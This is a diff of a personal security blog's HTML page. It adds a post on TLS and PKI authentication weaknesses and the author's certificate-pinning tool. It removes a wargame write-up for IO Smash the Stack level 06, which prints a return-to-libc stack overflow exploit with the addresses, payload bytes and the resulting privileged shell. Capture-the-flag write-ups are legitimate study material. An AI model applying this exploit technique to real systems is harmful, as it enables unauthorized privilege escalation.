@@ -108,6 +108,65 @@
   
   <div class="post">
     <h1 class="post-title">
+      <a href="/posts/TLS">
+        TLS and PKI
+      </a>
+    </h1>
+
+    <span class="post-date">18 Feb 2015</span>
+
+    <p>Today we are going to talk about TLS and its nuances when the authentication takes place. For those who do not know my master thesis work was about this topic. TLS is likely to be the security protocol most used on Internet. TLS aims to provide: confidentiality, authentication and integrity. If one of these properties are not achieved our security is useless. No matter what strong our cipher be if we are talking with the wrong guy, I mean, if we talk with Facebook or whatever server we must ensure that we are talking with the right entity. TLS besides troubles with authentication also has had troubles with encryption, implementation and many others but today I am only going to write about authentication.</p>
+
+<p>When we connect to a server using TLS, previous to exchange data that belongs to the application, it starts a phase; whose name is Handshake Protocol, to establish parameters of the communication as well as: TLS version, algorithms, master-secret ... etc.  <img src="http://orm-chimera-prod.s3.amazonaws.com/1230000000545/images/hpbn_0402.png" alt="handshake"></p>
+
+<p>One of those messages aims to authenticate the server. This message is the certificate, but it is composed of various certificates forming a chain. </p>
+
+<p><img src="http://orm-chimera-prod.s3.amazonaws.com/1230000000545/images/hpbn_0405.png" alt="chain-trust"></p>
+
+<p>The client to be sure that it&#39;s talking with the real server validates that certificate using PKI. Basically it ensures that the certificate belongs to the domain that the user had connected, is not expired, is not revoked and is signed by a root certificate that belongs to a CA -Certificate Authority-. These root certificates are trusted by anyone on Internet. The danger of this is that any CA can issue certificates for whatever domain and everything is correct. What would happen if a CA is compromised? The answer of this is simple; the attacker has the ability to issue valid certificates for Google&#39;s and  Facebook&#39;s domain for example. This has happened in the past like <a href="http://en.wikipedia.org/wiki/DigiNotar">DigiNotar</a>. There are other issues with authentication in TLS related for example with the <a href="https://www.imperialviolet.org/2014/04/19/revchecking.html">revocation status</a>.</p>
+
+<p>Despite this wild environment where TLS is working now, there are new technologies that have emerged to try fix some issues. That has been my work during my master thesis; a study of each of the brand technologies, although some of them have been for years, to develop a little tool to strengthen the authentication. These technologies are.</p>
+
+<ul>
+<li>DANE</li>
+<li>Pinning</li>
+<li>Certificate Transparency</li>
+<li>Blacklist</li>
+<li>ICSI Notary</li>
+<li>OCSP Checking</li>
+</ul>
+
+<p>In internet you may find more information about these technologies but I am going to write a little bit about the most important ones.</p>
+
+<p>Pinning by now is the most prominent because it reduces the attack surface. Basically pinning saves what it expects to receive. Now if we receive a certificate that belongs to Facebook this must be equal to the saved value if not, we are under attack. The question regarding pinning is about which certificate save. Normally is saved the hash of the SubjectPublicKeyInfo of the certificate. The real problem is which certificate on the chain choose. There is another problem with pinning. As client, how can I retrieve that information in a security fashion and trustworthy? In other words the bootstrapping. Pinning is a huge improvement but much works remains to be done. There are options to implement pinning nowadays, one is a draft to bring <a href="http://tools.ietf.org/html/draft-ietf-websec-key-pinning-21">pinning to HTTP</a> and other is Moxie&#39;s approach that bring Pinning to TLS, whose name is <a href="https://tack.io">TACK</a> (it seems that TACK domain is not longer working).</p>
+
+<p>DANE brings the pinning information using DNS architecture. But DNS is not secure that is why instead of DNS uses DNSSEC. Regarding DNSSEC many have been written <a href="https://www.imperialviolet.org/2015/01/17/notdane.html">[1]</a><a href="http://sockpuppet.org/blog/2015/01/15/against-dnssec/">[2]</a>.</p>
+
+<p>Certificate Transparency is a proposal by Google that tired of seeing CA compromised or rogue, decided to build a huge database of all certificates to try monitor them with the aim to catch before such certificates misuse. This approach is under experiment although Chrome is forcing to use it by those certificates with EV.</p>
+
+<p>The tool that I developed is a sniffer that listen the network to extract the certificate that is exchanged during the TLS Handshake, to apply these techniques and get a better response and detect possible MITM attacks. Also there is a little framework that provides a means to notify the user about problems related with the authentication. Anyone would be free to add different approaches. I wrote a little python code to send a notification to the Notification Center on Mac OS X. Is possible to write different methodologies to validate a certificate since the project is written to make this easy to accomplish. Check the tool on <a href="https://github.com/alvarofe/cassle">cassle</a>.</p>
+
+<iframe width="600" height="400" src="https://www.youtube.com/embed/iIAdJ92nIgU" frameborder="0" allowfullscreen></iframe>
+
+<p>I had thought to take it to another level and insted of listen the network since I do not have any possibility to shutdown the connection make it more active. I had thought to write a library to hook or extend the OpenSSL library to include these methodologies. But it turns out that there were others that had thought the same and the result is the following <a href="https://github.com/iSECPartners/publications/blob/master/whitepapers/certshim_ccs14.pdf?raw=true">CERTSHIM</a>. I will try to look more close at it and learning how they are doing it :).</p>
+
+<p>Now I am developing the evolution of cassle and the name is gocassle, basically because is implemented using Golang. Python has some limitations about create concurrency program due to the GIL, since finally all the threads on python are going to be bloqued by GIL and only one will be executed and the idea to create processes is expensive. So I decided to try Golang and the result is that I&#39;m in love with Golang since thanks to goroutines and channels is possible write concurrency program easily and also is a compiled language so the efficiency is going to be better. Golangs remember me write C code and I love it and I wanted to learn it. </p>
+
+<p>The idea of gocassle is basically build a distributed  system to pin the network. There will be slaves and masters. These slaves are going to listen the network to extract the certificates and send them to the master. The master will have a database with pins obtained from its slaves. After that the slave and other software, could use the master&#39;s database to know about what certificate must be received. </p>
+
+<p>I do not know to where I&#39;ll get, as have to combine these with other things as find a job, study things and so on. But at least I would like to develop something very easily not very complicated by now, to see the value of the tool. The tool will be at <a href="https://www.github.com/alvarofe/gocassle">gocassle</a>.</p>
+
+<p>If you are interested on TLS I recommend you follow on Twitter or reading in internet about their researches: Moxie Marlinspike, Ivan Ristic and Adam Langley.</p>
+
+<p>If you liked this post, you can
+<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/TLS&text=TLS and PKI&via=alvaro_fe">share it with your followers</a>
+or
+<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
+
+  </div>
+  
+  <div class="post">
+    <h1 class="post-title">
       <a href="/posts/level08smash">
         Level 08 I/O Smash the Stack
       </a>
@@ -242,161 +301,6 @@ XXXXXXXXXXX
 
 <p>If you liked this post, you can
 <a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level08smash&text=Level 08 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
-or
-<a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
-
-  </div>
-  
-  <div class="post">
-    <h1 class="post-title">
-      <a href="/posts/level06iosmash">
-        Level 06 I/O Smash the Stack
-      </a>
-    </h1>
-
-    <span class="post-date">26 Dec 2014</span>
-
-    <p>Those days I have been playing a little bit with <a href="http://io.smashthestack.org/">IO Smash the Stack</a>. By now I am in the level 8.</p>
-
-<p>Today I will explain how I resolved the level06 and the process that I followed. In this level we have the code and it is more large than the previous.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="c1">//written by bla</span>
-<span class="c1">//inspired by nnp</span>
-<span class="cp">#include &lt;stdio.h&gt;</span>
-<span class="cp">#include &lt;stdlib.h&gt;</span>
-<span class="cp">#include &lt;string.h&gt;</span>
-
-<span class="k">enum</span><span class="p">{</span>
-<span class="n">LANG_ENGLISH</span><span class="p">,</span>
-<span class="n">LANG_FRANCAIS</span><span class="p">,</span>
-<span class="n">LANG_DEUTSCH</span><span class="p">,</span>
-<span class="p">};</span>
-
-<span class="kt">int</span> <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_ENGLISH</span><span class="p">;</span>
-
-<span class="k">struct</span> <span class="n">UserRecord</span><span class="p">{</span>
-    <span class="kt">char</span> <span class="n">name</span><span class="p">[</span><span class="mi">40</span><span class="p">];</span>
-    <span class="kt">char</span> <span class="n">password</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span>
-    <span class="kt">int</span> <span class="n">id</span><span class="p">;</span>
-<span class="p">};</span>
-
-<span class="kt">void</span> <span class="nf">greetuser</span><span class="p">(</span><span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span><span class="p">){</span>
-    <span class="kt">char</span> <span class="n">greeting</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-    <span class="k">switch</span><span class="p">(</span><span class="n">language</span><span class="p">){</span>
-        <span class="k">case</span> <span class="nl">LANG_ENGLISH</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Hi &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-        <span class="k">case</span> <span class="nl">LANG_FRANCAIS</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Bienvenue &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-        <span class="k">case</span> <span class="nl">LANG_DEUTSCH</span><span class="p">:</span>
-            <span class="n">strcpy</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="s">&quot;Willkommen &quot;</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="n">strcat</span><span class="p">(</span><span class="n">greeting</span><span class="p">,</span> <span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">greeting</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">env</span><span class="p">){</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;USAGE: %s [name] [password]</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
-        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="k">struct</span> <span class="n">UserRecord</span> <span class="n">user</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
-    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">name</span><span class="p">));</span>
-    <span class="n">strncpy</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">user</span><span class="p">.</span><span class="n">password</span><span class="p">));</span>
-
-    <span class="kt">char</span> <span class="o">*</span><span class="n">envlang</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&quot;LANG&quot;</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">envlang</span><span class="p">)</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;fr&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
-            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_FRANCAIS</span><span class="p">;</span>
-        <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">envlang</span><span class="p">,</span> <span class="s">&quot;de&quot;</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
-            <span class="n">language</span> <span class="o">=</span> <span class="n">LANG_DEUTSCH</span><span class="p">;</span>
-
-    <span class="n">greetuser</span><span class="p">(</span><span class="n">user</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></div>
-<p>What this code does is easy to understand and also it is easy to spot where the vulnerability resides. Is in the function <code>strcat</code>. If we go to the <code>man page</code>.</p>
-
-<blockquote>
-<p>The  strcat() function appends the src string to the dest string, overwriting the terminating null byte (&#39;\0&#39;) at the end of dest, and then adds a terminating null byte.  The strings may not overlap, and the dest string must have enough space for the result.  If dest is not large enough, program behavior is unpredictable; buffer overruns  are  a  favorite  avenue  for  attacking secure programs.</p>
-
-<p>The strncat() function is similar, except that</p>
-
-<ul>
-<li> it will use at most n bytes from src; and</li>
-<li> src does not need to be null-terminated if it contains n or more bytes.</li>
-</ul>
-</blockquote>
-
-<p>Basically strcat will append the src string until we get the <code>\0</code>. How we want to overflow the stack of greeting in the function <code>greetuser</code> we should look how the stack looks like when this function is called. To find out we will use <code>gdb</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>disas greetuser
-Dump of assembler code <span class="k">for</span> <span class="k">function</span> greetuser:
-   0x0804851c &lt;+0&gt;: push   ebp
-   0x0804851d &lt;+1&gt;: mov    ebp,esp
-   0x0804851f &lt;+3&gt;: sub    esp,0x58
-   0x08048522 &lt;+6&gt;: mov    eax,ds:0x8049964
-   0x08048527 &lt;+11&gt;:    cmp    eax,0x1
-   0x0804852a &lt;+14&gt;:    je     0x8048540 &lt;greetuser+36&gt;
-   0x0804852c &lt;+16&gt;:    cmp    eax,0x2
-   0x0804852f &lt;+19&gt;:    je     0x804855c &lt;greetuser+64&gt;
-   0x08048531 &lt;+21&gt;:    <span class="nb">test   </span>eax,eax
-   0x08048533 &lt;+23&gt;:    jne    0x8048574 &lt;greetuser+88&gt;
-   0x08048535 &lt;+25&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048538 &lt;+28&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x206948
-   0x0804853e &lt;+34&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
-   0x08048540 &lt;+36&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048543 &lt;+39&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6e656942
-   0x08048549 &lt;+45&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x756e6576
-   0x08048550 &lt;+52&gt;:    mov    WORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x2065
-   0x08048556 &lt;+58&gt;:    mov    BYTE PTR <span class="o">[</span>eax+0xa<span class="o">]</span>,0x0
-   0x0804855a &lt;+62&gt;:    jmp    0x8048574 &lt;greetuser+88&gt;
-   0x0804855c &lt;+64&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x0804855f &lt;+67&gt;:    mov    DWORD PTR <span class="o">[</span>eax<span class="o">]</span>,0x6c6c6957
-   0x08048565 &lt;+73&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x4<span class="o">]</span>,0x6d6d6f6b
-   0x0804856c &lt;+80&gt;:    mov    DWORD PTR <span class="o">[</span>eax+0x8<span class="o">]</span>,0x206e65
-   0x08048573 &lt;+87&gt;:    nop
-   0x08048574 &lt;+88&gt;:    lea    eax,<span class="o">[</span>ebp+0x8<span class="o">]</span>
-   0x08048577 &lt;+91&gt;:    mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,eax
-   0x0804857b &lt;+95&gt;:    lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x0804857e &lt;+98&gt;:    mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x08048581 &lt;+101&gt;:   call   0x80483d0 &lt;strcat@plt&gt;
-   0x08048586 &lt;+106&gt;:   lea    eax,<span class="o">[</span>ebp-0x48<span class="o">]</span>
-   0x08048589 &lt;+109&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
-   0x0804858c &lt;+112&gt;:   call   0x80483f0 &lt;puts@plt&gt;
-   0x08048591 &lt;+117&gt;:   leave
-   0x08048592 &lt;+118&gt;:   ret
-End of assembler dump.
-gdb-peda<span class="nv">$ </span>b * 0x0804857e  <span class="p">;</span> Breakpoint before to call strcat
-gdb-peda<span class="nv">$ </span>r AAAAAAAAAAAAAAAA BBBBBBBBBBBBBBB
-gdb-peda<span class="nv">$ </span>x/64xw <span class="nv">$esp</span>
-</code></pre></div>
-<p><img src="/public/images/stackio6.png" alt="stackio6"></p>
-
-<p>To exploit this we are going to use the technique <a href="http://insecure.org/sploits/linux.libc.return.lpr.sploit.html">Return Into Lib C</a>. What we have to do is overwrite the return address <code>0x080486af</code> with the system address and then build a fake stack such that when we resume the execution at the direction of system it sees a valid stack. It would be as simple as put the direction of exit followed by the direction of the string <code>/bin/sh</code>. All these directions can be uncovered with <code>gdb</code>.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">gdb-peda<span class="nv">$ </span>p system
-<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7ea9c30 &lt;system&gt;
-gdb-peda<span class="nv">$ </span>p <span class="nb">exit</span>
-<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0xb7e9d270 &lt;<span class="nb">exit</span>&gt;
-gdb-peda<span class="nv">$ </span>searchmem /bin/sh
-Searching <span class="k">for</span> <span class="s1">&#39;/bin/sh&#39;</span> in: None ranges
-Found <span class="m">1</span> results, display max <span class="m">1</span> items:
-libc : 0xb7faafb4 <span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>
-</code></pre></div>
-<p>So the beginning of the <code>argv[1]</code> must be the direction of <code>
-exit</code> and then the direction of the string <code>/bin/sh</code> followed by as much data as needed until we reach the return address to overwrite it with the direction of system. To exploit it more easily is better use as language <code>FRANCAIS</code> or <code>DEUTSCH</code> since that will fill the <code>greeting</code> variable with more data. Since with the <code>english</code> version the <code>id</code> was initialize to <code>0</code> making the strcat function stopping when it reaches that value.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
-en_GB.UTF-8
-level6@io:/levels<span class="nv">$ LANG</span><span class="o">=</span>de_GB.UTF-8
-level6@io:/levels<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$LANG</span>
-de_GB.UTF-8
-</code></pre></div>
-<p>And finally we get a fresh shell calling it as follows.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash">level6@io:/levels<span class="nv">$ </span>./level06 <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;\x70\xd2\xe9\xb7&quot; + &quot;\xb4\xaf\xfa\xb7&quot; + &quot;A&quot;*32&#39;</span><span class="sb">`</span> <span class="sb">`</span>python -c <span class="s1">&#39;print &quot;B&quot;*25 + &quot;\x30\x9c\xea\xb7&quot;&#39;</span><span class="sb">`</span>
-Willkommen p�鷴��AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBB0��
-sh-4.2<span class="nv">$ </span>id
-<span class="nv">uid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1006<span class="o">(</span>level6<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1007<span class="o">(</span>level7<span class="o">)</span>,1006<span class="o">(</span>level6<span class="o">)</span>,1029<span class="o">(</span>nosu<span class="o">)</span>
-sh-4.2<span class="err">$</span>
-</code></pre></div>
-<p>If you liked this post, you can
-<a href="https://twitter.com/intent/tweet/?url=http://alvarofe.github.io/posts/level06iosmash&text=Level 06 I/O Smash the Stack&via=alvaro_fe">share it with your followers</a>
 or
 <a href="https://twitter.com/alvaro_fe"> follow me on Twitter</a>!</p>
 
